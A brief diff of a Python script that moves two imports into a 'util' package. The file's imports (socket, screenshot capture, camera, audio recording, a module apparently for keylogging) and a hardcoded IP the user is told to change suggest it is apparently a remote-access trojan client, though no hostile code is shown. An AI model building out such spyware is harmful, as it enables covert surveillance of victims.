@@ -3,7 +3,7 @@ import os
 import simplejson
 import base64
 import socket
-import kg
+from util import kg
 import time
 import threading
 import pyttsx3
@@ -11,7 +11,7 @@ from PIL import ImageGrab
 import sys
 import shutil
 import cv2
-import sound_record
+from util import sound_record
 import tkinter
 
 ip = "192.168.1.105" # Bu değerleri kendinize göre değiştirin.
